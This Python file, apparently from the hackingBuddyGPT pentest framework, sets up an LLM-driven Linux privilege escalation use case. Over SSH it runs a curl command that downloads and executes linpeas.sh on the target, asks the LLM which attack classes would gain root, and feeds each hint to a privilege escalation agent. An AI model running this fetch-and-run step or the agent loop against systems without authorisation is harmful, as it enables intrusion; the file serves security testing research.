from mako.template import Template

from hackingBuddyGPT.capabilities import SSHRunCommand
from hackingBuddyGPT.usecases.usecase import UseCase, use_case
from hackingBuddyGPT.utils.connectors.ssh_connection import SSHConnection
from hackingBuddyGPT.utils.openai.openai_llm import OpenAIConnection
from .linux_privesc import PrivEscLinux # Assumindo a estrutura do padrão LSE

template_linpeas = Template("""
Create a list of up to ${number} attack classes that you would try on a linux system
(to achieve root level privileges) given the following output from linpeas.sh:

~~~ bash
${linpeas_output}
~~~

only output the list of attack classes, for each attack class only output a single
short sentence.""")

@use_case("Linux Privilege Escalation using linpeas.sh for initial guidance")
class ExPrivEscLinuxLinPEASUseCase(UseCase):
    conn: SSHConnection = None
    max_turns: int = 20
    enable_explanation: bool = False
    enable_update_state: bool = False
    disable_history: bool = False
    llm: OpenAIConnection = None

    def call_linpeas_against_host(self):
        self.log.console.print("[green]performing initial enumeration with linpeas.sh")

        run_cmd = (
            "curl -sL 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh' -o linpeas.sh;"
            "chmod 700 linpeas.sh;"
            "./linpeas.sh -q | sed -r 's/\\x1B\\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g'"
        )

        result, _ = SSHRunCommand(conn=self.conn, timeout=300)(run_cmd)

        self.log.console.print(f"[yellow]got the output: {result[:500]}...")
        cmd = self.llm.get_response(template_linpeas, linpeas_output=result, number=3)
        self.log.console.print(f"[yellow]got the cmd: {cmd.result}")

        return [x for x in cmd.result.splitlines() if x.strip()]

    def get_name(self) -> str:
        return self.__class__.__name__

    def run(self, configuration={}):
        self.log.start_run(self.get_name(), self.serialize_configuration(configuration))
        
        hints = self.call_linpeas_against_host()
        turns_per_hint = int(self.max_turns / len(hints)) if hints else self.max_turns

        for hint in hints:
            self.log.console.print(f"[yellow]Calling a use-case to perform the privilege escalation: {hint}")
            if self.run_using_usecases(hint, turns_per_hint):
                self.log.console.print("[green]Got root!")
                return True
        return False

    def run_using_usecases(self, hint, turns_per_hint):
        linux_privesc = PrivEscLinux(
            conn=self.conn,
            enable_explanation=self.enable_explanation,
            enable_update_state=self.enable_update_state,
            disable_history=self.disable_history,
            llm=self.llm,
            hints=f"hint:{hint}",
            max_turns=turns_per_hint,
            log=self.log,
        )
        linux_privesc.init()
        return linux_privesc.run({})